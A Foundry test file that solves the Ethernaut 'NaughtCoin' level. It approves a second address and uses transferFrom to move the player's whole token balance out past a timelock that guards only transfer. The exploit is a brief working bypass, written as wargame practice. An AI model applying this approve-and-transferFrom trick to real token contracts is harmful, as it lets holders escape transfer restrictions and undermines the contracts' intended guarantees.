// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/NaughtCoin.sol";
import "src/levels/NaughtCoinFactory.sol";

contract TestNaughtCoin is BaseTest {
    NaughtCoin private level;
    uint256 public INITIAL_SUPPLY = 1000000 * 1e18;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new NaughtCoinFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = NaughtCoin(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.balanceOf(player), INITIAL_SUPPLY);
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        address recipient = vm.addr(1);

        vm.startPrank(player);

        // lockTokens modifier is what prevents us from transferring the tokens before timeLock duration
        // ERC20 tokens can be transferred via two functions: a) transfer and b) transferFrom
        // lockTokens modifier is on transfer fn but not on transferFrom which means that
        // we can bypass the 10 years timelock duration if we transfer tokens using transferFrom

        // Approving tokens so that the spender address can call transferFrom to tranfer tokens from our account

        level.approve(recipient, 2**256 - 1);

        vm.stopPrank();

        vm.prank(recipient);
        level.transferFrom(player, recipient, INITIAL_SUPPLY);

        assertEq(level.balanceOf(player), 0);
        assertEq(level.balanceOf(recipient), INITIAL_SUPPLY);
    }
}
